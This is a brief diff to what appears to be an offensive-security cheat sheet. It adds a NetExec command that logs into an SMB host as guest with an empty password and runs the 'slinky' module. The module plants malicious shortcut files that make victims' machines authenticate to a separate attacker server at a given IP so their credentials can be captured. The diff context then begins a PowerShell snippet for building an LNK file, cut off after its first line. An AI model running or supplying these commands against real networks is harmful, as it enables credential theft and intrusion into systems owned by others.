@@ -1,3 +1,8 @@
+NXC automated
+```bash
+nxc smb 10.1.69.229 -u 'guest' -p '' -M slinky -o SERVER=10.200.118.203 NAME=test
+```
+
 LNK File
 ```powershell
 $objShell = New-Object -ComObject WScript.shell 
